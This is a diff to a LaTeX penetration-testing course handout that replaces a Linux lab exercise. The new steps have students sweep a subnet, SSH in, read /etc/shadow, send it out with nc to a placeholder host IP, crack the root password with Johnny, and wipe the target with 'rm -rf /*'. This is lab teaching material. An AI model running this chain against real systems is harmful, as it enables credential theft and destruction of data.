@@ -1905,27 +1905,37 @@ alias ls="ls --color=auto"
 	\section{Programming Challenges}
 		\subsection{Linux Challenges}
 			\subsubsection{Introduction to Linux}
-				Login to your computer and bring up the Kali-VECC VM in VMware Workstation. 
-				This is the VM that we will be working with for all Linux and attack classes.    
-				The steps required to succeed in this challenge are as follows:
-				\begin{enumerate}
-					\item SSH into the remote box as admin.
-					\item Become root using su, password root:toor.
-					\item Create user acidBurn.
-					\item Become the user acidBurn.
-					\item Upload /usr/share/wordlists/rockyou.txt to remote acidBurn home.
-					\item create file flag.out in acidBurn home. 
-					\item change the hostname of the machine to Gibson. 
-					\item Execute \href{flagGen.sh}{code:flagGen}.
-					\item Retrieve the flag stored in flag.out. 
-				\end{enumerate}
+				This session is designed to familerize you with the Linux command line. 
+				The goal of this is both to show you how the Linux command line works, and some of its pitfalls. 
+				By the end, you will see both a poorly configured permissions system, and a command which when used the wrong way, will destroy a system. 
 
-			\begin{code}
-				\lstinputlisting[language={Bash}]{./flagGen.sh}
-				\caption{A basic flag generator which will give you a flag if a number of system requirements are setup}
-				\label{code:flagGen}
-			\end{code}
-			\subsubsection{Hard Course: Installing Arch Linux}
+				The reason that this is useful to know is that Linux, while also being an exceptionally useful OS, is also the main OS for Penetration testing tools. 
+				Thus, understanding the Linux command line is quite useful considering that most of these tools are based on this environment. 
+
+				The following steps will be required to find the flag and wipe the system.  
+	
+				\begin{enumerate}
+					\item Use ``fping'' to check whether the remote host is running and find which IP address it has. 
+						The command for this is ``fping -g XXX.XXX.XXX.0/25''. 
+					\item Use ``SSH to get command line access to the remote host. 
+					% Privelage Ex?
+					\item Cat/Less/vim/nano ``/etc/shadow'' and copy the root password to your system. 
+						\begin{itemize}
+							\item If you would like to make this more interesting, manually send the file to your system. 
+							\item Set up a nc listener on any high port with ``nc -l -p XXXX > <output file>''. 
+							\item Send the file using ``nc -p XXXX <local host IP> < <input file>''. 
+							\item The file should now be on your machine called ``<output file>''. 
+						\end{itemize}
+					\item Open Johnny and tell it to use the file that you created in the last step. 
+					\item switch user to the root account using ``su root'' and the password that Johnny gave you.  
+					\item Run the command ``rm -rf /* ''. 
+					\item You have now successfully wiped the remote host. 
+				\end{enumerate}
+			\subsubsection{Hard Course: Setting up a VM and installing Kali Rolling}
+				This session will teach you both how to set up a VM in VMware Workstation and install and configure Kali Rolling within it. 
+				This will be important to you as it is your main means of security to ensure that you are not attacking a target that you shouldn't be. 
+				With properly configured VMs and virtual networks, you cannot attack the wrong target, but without them, a single mistype and you could be attacking a completely different target. 
+			
 \chapter{Cryptography}
 	\label{ch:Cryptography}
 	\section{Introduction to Cryptography}
